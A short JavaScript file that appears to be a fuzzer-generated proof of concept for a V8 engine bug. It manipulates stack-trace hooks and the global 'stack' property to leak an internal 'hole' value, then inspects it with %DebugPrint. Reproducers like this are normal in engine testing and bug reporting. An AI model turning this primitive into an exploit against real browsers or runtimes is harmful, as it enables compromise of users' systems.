var h0le = [Object];
function boom() {
    var h00le = h0le;
    function rGlobal() {
        h00le[0] = stack;
        return h00le;
    }
    Error.captureStackTrace(globalThis);
    function f10() {
        try {
            Reflect.deleteProperty(Error, "prepareStackTrace");
        } catch(e14) {
        }
        try {
            Reflect.deleteProperty(globalThis, "stack");
        } catch(e18) {
        }
        const v21 = { configurable: false, writable: true, enumerable: true, value: 1 };
        try {
            Reflect.defineProperty(globalThis, "stack", v21);
        } catch(e28) {
        }
        stack = undefined;
        for (let i32 = 0; i32 < 20480; i32++) {
            try {
                rGlobal();
            } catch(e39) {
            }
        }
        return undefined;
    }
    Error.prepareStackTrace = f10;
    Reflect.defineProperty(globalThis, "stack", { configurable: true, writable: true, enumerable: true, value: undefined });
    delete globalThis.stack;
    try {
        rGlobal();
    } catch(e51) {
    }
    const v53 = %DebugPrint(h0le[0]);
    const v45 = v53;
}
boom();
